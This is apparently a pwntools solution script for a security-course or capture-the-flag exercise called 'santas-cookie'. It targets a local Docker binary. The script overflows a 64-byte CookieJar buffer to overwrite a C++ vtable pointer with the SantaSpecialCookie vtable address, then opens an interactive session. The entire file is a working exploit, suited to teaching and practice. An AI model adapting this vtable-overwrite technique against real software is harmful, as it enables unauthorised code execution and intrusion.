#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve_exam_prep.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/santas-cookie')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'
pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
pwn.pause()

# we need a SantaSpecialCookie, then we are done
# we have a buffer overflow in CookieJar, write 64 chars arbitrary, then we can write 8 byte vtable pointer
# no-pie, so vtable is well-known:
# objdump -t ./vuln | c++filt | grep vtable
"""
0000000000000000       O *UND*	0000000000000000              vtable for __cxxabiv1::__class_type_info@CXXABI_1.3
0000000000403da0  w    O .data.rel.ro	0000000000000018              vtable for SantaSpecialCookie
0000000000000000       O *UND*	0000000000000000              vtable for __cxxabiv1::__si_class_type_info@CXXABI_1.3
0000000000403db8  w    O .data.rel.ro	0000000000000018              vtable for Cookie
"""
# telescope 0x0000000000403da0
vtable_special_cookie = 0x0000000000403da0 + 16
conn.sendlineafter(b'Cookie decoration > ', b'A'*64 + pwn.p64(vtable_special_cookie))
conn.interactive()
